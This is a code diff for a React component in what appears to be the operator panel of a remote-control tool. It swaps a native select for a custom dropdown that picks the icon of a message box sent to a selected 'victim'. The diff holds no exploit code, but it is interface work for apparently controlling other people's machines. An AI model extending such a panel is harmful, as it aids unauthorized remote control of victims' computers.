@@ -1,11 +1,20 @@
 "use client";
 
-import { useEffect } from "react";
+import { useEffect, useRef, useState } from "react";
 import { useQueryClient } from "@tanstack/react-query";
+import { createPortal } from "react-dom";
 
 import { usePanelDetailView } from "../panel-detail-view-provider";
 import { usePanelWS } from "../../../ws/ws-provider";
 import { bindRoflActions } from "./rofl/bind-rofl-actions";
+
+const ICON_OPTIONS = [
+    { value: "info", label: "Info" },
+    { value: "error", label: "Error" },
+    { value: "warning", label: "Warning" },
+    { value: "question", label: "Question" },
+    { value: "none", label: "None" },
+];
 
 const CARD =
     "rofl-card w-[420px] max-w-[calc(100vw-420px)] ml-[4px] rounded-[18px] border border-white/[0.14] " +
@@ -22,14 +31,46 @@ export function RoflSection() {
     const detail = usePanelDetailView();
     const ws = usePanelWS();
     const qc = useQueryClient();
+    const [iconValue, setIconValue] = useState("info");
+    const [iconMenuOpen, setIconMenuOpen] = useState(false);
+    const iconBtnRef = useRef<HTMLButtonElement | null>(null);
+    const iconMenuRef = useRef<HTMLDivElement | null>(null);
+    const [iconMenuPos, setIconMenuPos] = useState<{ left: number; top: number; width: number } | null>(null);
+
+    useEffect(() => {
+        if (!iconMenuOpen) return;
+        const btn = iconBtnRef.current;
+        if (!btn) return;
+        const rect = btn.getBoundingClientRect();
+        setIconMenuPos({
+            left: rect.left,
+            top: rect.bottom + 6,
+            width: rect.width,
+        });
+    }, [iconMenuOpen]);
 
     useEffect(() => {
         return bindRoflActions({
             selectedVictimId: detail.selectedVictimId,
             qc,
             ws,
+            getIconValue: () => iconValue,
         });
-    }, [detail.selectedVictimId, qc, ws]);
+    }, [detail.selectedVictimId, qc, ws, iconValue]);
+
+    useEffect(() => {
+        const handleClickOutside = (e: MouseEvent) => {
+            const target = e.target as Node;
+            if (iconMenuRef.current && !iconMenuRef.current.contains(target) &&
+                iconBtnRef.current && !iconBtnRef.current.contains(target)) {
+                setIconMenuOpen(false);
+            }
+        };
+        if (iconMenuOpen) {
+            document.addEventListener("click", handleClickOutside);
+            return () => document.removeEventListener("click", handleClickOutside);
+        }
+    }, [iconMenuOpen]);
 
     return (
         <div className="detail-section h-[100dvh] overflow-y-auto pb-[60px]" data-section="rofl">
@@ -104,13 +145,53 @@ export function RoflSection() {
 
                     <div className="grid grid-cols-[90px_1fr] items-center gap-[10px] my-[8px]">
                         <div className="text-[14px] font-semibold text-[rgba(235,235,235,0.94)]">Icon:</div>
-                        <select id="roflMsgIcon" className="rofl-select w-full rounded-[10px] border border-white/[0.18] bg-[rgba(0,0,0,0.52)] px-[10px] py-[7px] text-[14px] text-white outline-none appearance-none">
-                            <option value="info">Info</option>
-                            <option value="error">Error</option>
-                            <option value="warning">Warning</option>
-                            <option value="question">Question</option>
-                            <option value="none">None</option>
-                        </select>
+                        <div className="relative w-full">
+                            <button
+                                ref={iconBtnRef}
+                                type="button"
+                                className="w-full flex h-[32px] items-center gap-[6px] rounded-[10px] border border-white/[0.12] bg-white/[0.04] px-[10px] text-[13px] font-semibold text-white/80 justify-between transition-all cursor-pointer hover:bg-white/[0.07] hover:border-white/[0.18] hover:text-white"
+                                onClick={() => setIconMenuOpen(!iconMenuOpen)}
+                            >
+                                <span>{ICON_OPTIONS.find((o) => o.value === iconValue)?.label || "Info"}</span>
+                                <span className="text-[10px] opacity-50">▼</span>
+                            </button>
+
+                            {iconMenuOpen && iconMenuPos
+                                ? createPortal(
+                                    <div
+                                        ref={iconMenuRef}
+                                        className="fixed z-[9999] max-h-[240px] overflow-auto rounded-[14px] border border-white/[0.12] bg-[rgba(16,16,16,0.96)] p-[6px] text-white shadow-[0_14px_34px_rgba(0,0,0,0.55)]"
+                                        style={{ left: iconMenuPos.left, top: iconMenuPos.top, minWidth: iconMenuPos.width }}
+                                        role="listbox"
+                                    >
+                                        {ICON_OPTIONS.map((opt) => {
+                                            const selected = iconValue === opt.value;
+                                            return (
+                                                <button
+                                                    key={opt.value}
+                                                    type="button"
+                                                    className={
+                                                        "w-full flex items-center justify-start px-[10px] py-[9px] rounded-[12px] text-[13px] leading-[1.15] font-semibold transition-[background,border-color] cursor-pointer border " +
+                                                        (selected
+                                                            ? "bg-white/[0.07] border-white/[0.16] text-white"
+                                                            : "bg-transparent border-transparent text-white/90 hover:bg-white/[0.045] hover:border-white/[0.10]")
+                                                    }
+                                                    onClick={() => {
+                                                        setIconValue(opt.value);
+                                                        setIconMenuOpen(false);
+                                                    }}
+                                                    role="option"
+                                                    aria-selected={selected}
+                                                >
+                                                    {opt.label}
+                                                </button>
+                                            );
+                                        })}
+                                    </div>,
+                                    document.body,
+                                )
+                                : null}
+                        </div>
                     </div>
 
                     <div className="grid grid-cols-[90px_1fr] items-center gap-[10px] my-[8px]">
